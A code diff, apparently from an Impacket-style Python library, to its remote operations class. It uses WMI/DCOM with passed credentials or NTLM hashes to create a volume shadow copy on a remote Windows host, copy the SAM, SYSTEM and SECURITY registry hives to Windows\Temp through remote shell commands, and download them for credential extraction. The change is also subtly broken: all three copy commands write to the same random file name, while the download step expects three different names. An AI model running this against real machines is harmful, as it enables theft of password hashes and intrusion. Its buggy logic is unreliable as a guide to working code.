@@ -1065,8 +1065,8 @@ class RemoteOperations:
 
         return shadowId
 
-    def __wmiGetLastSSRemotePath(self, ssID):
-        query = 'SELECT InstallDate FROM Win32_ShadowCopy where ID="%s"' % ssID
+    def __wmiGetLastSSDeviceObject(self, ssID):
+        query = 'SELECT DeviceObject,VolumeName FROM Win32_ShadowCopy where ID="%s"' % ssID
         username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
         dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
                               oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
@@ -1076,19 +1076,50 @@ class RemoteOperations:
         iWbemLevel1Login.RemRelease()
 
         result = iWbemServices.ExecQuery(query)
-        query_result = result.Next(0xffffffff, 1)[0].InstallDate
-
-        year = query_result[:4]
-        month = query_result[4:6]
-        day = query_result[6:8]
-        hour = query_result[8:10]
-        minute = query_result[10:12]
-        second = query_result[12:14]
+        obj = result.Next(0xffffffff, 1)[0]
 
         dcom.disconnect()
 
-        return "@GMT-%s.%s.%s-%s.%s.%s" % (year, day, month, hour, minute, second)
+        return (obj.DeviceObject,obj.VolumeName)
 
+    def __WMIcopy(self, sourcePath, destinationPath):
+        query = 'SELECT * FROM CIM_LogicalFile WHERE Name="%s"' % sourcePath
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
+        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        iWbemLevel1Login.RemRelease()
+
+        result = iWbemServices.ExecQuery(query)
+        obj = result.Next(0xffffffff, 1)[0]
+        obj.Copy(destinationPath)
+
+        dcom.disconnect()
+
+    def __wmiGetDriveLetterByVolumeName(self, volumeName):
+        query = 'SELECT DriveLetter,DeviceID FROM Win32_Volume'
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
+        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        iWbemLevel1Login.RemRelease()
+
+        result = iWbemServices.ExecQuery(query)
+
+        i = 1
+        driveObject = result.Next(0xffffffff, i)
+        while driveObject:
+            for obj in driveObject:
+                if obj.DeviceID == volumeName:
+                    return obj.DriveLetter
+            i += 1
+            driveObject = result.Next(0xffffffff, i)
+
+        return NULL
     def __executeRemote(self, data):
         self.__tmpServiceName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
@@ -1236,9 +1267,22 @@ class RemoteOperations:
         LOG.info('Creating SS')
         ssID = self.__wmiCreateShadow(volume)
         LOG.info('Getting SMB equivalent PATH to access remotely the SS')
-        remotePath = self.__wmiGetLastSSRemotePath(ssID)
+        ssVolume,originalVolume = self.__wmiGetLastSSDeviceObject(ssID)
+        pathToCopy = "%s\\Windows\\Temp" % self.__wmiGetDriveLetterByVolumeName(originalVolume)
 
-        paths = [('%s/SAM' % localPath, '%s\\System32\\Config\\SYSTEM' % remotePath), ('%s/SYSTEM' % localPath, '%s\\System32\\Config\\SYSTEM'), ('%s/SECURITY' % localPath, '%s\\System32\\Config\\SECURITY' % remotePath)]
+        randomNameSAM = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
+        randomNameSYSTEM = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
+        randomNameSECURITY = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
+
+        #self.__WMIcopy('%s\\System32\\Config\\SAM' % ssVolume, '%s\\%s' % (pathToCopy,randomNameSAM))
+        #self.__WMIcopy('%s\\System32\\Config\\SYSTEM' % ssVolume, '%s\\%s' % (pathToCopy,randomNameSYSTEM))
+        #self.__WMIcopy('%s\\System32\\Config\\SECURITY' % ssVolume, '%s\\%s' % (pathToCopy,randomNameSECURITY))
+
+        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SAM %s\\%s' % (ssVolume, pathToCopy, randomNameSAM))
+        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SYSTEM %s\\%s' % (ssVolume, pathToCopy, randomNameSAM))
+        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SECURITY %s\\%s' % (ssVolume, pathToCopy, randomNameSAM))
+
+        paths = [('%s/SAM' % localPath, 'Temp\\%s' % randomNameSAM), ('%s/SYSTEM' % localPath, 'Temp\\%s' % randomNameSYSTEM), ('%s/SECURITY' % localPath, 'Temp\\%s' % randomNameSECURITY)]
 
         for p in paths:
             with open(p[0], 'wb') as local_file:
